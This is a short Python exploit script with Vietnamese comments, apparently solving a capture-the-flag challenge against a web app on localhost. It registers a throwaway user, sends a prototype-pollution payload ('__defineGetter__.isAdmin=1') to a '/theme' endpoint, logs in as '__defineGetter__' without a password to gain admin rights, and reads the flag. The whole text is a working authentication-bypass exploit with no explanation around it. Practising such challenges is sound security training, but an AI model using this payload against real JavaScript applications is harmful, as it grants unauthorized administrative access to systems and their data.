import requests, random

HOST = 'http://localhost:3000'
sess = requests.Session()

# Đăng ký user mới (có thể không quan trọng lắm)
username = password = random.randbytes(4).hex()
register_data = {'username': username, 'password': password}
sess.post(HOST + '/register', data=register_data, allow_redirects=False)
print(username)
print(password)
# Gửi request để pollute prototype
sess.get(HOST + '/theme?__defineGetter__.isAdmin=1', allow_redirects=False)

# Login với username = '__defineGetter__', bỏ password
login_data = {'username': '__defineGetter__'}
sess.post(HOST + '/login', data=login_data, allow_redirects=False)

# Lấy flag
print(sess.get(HOST + '/flag', allow_redirects=False).text)
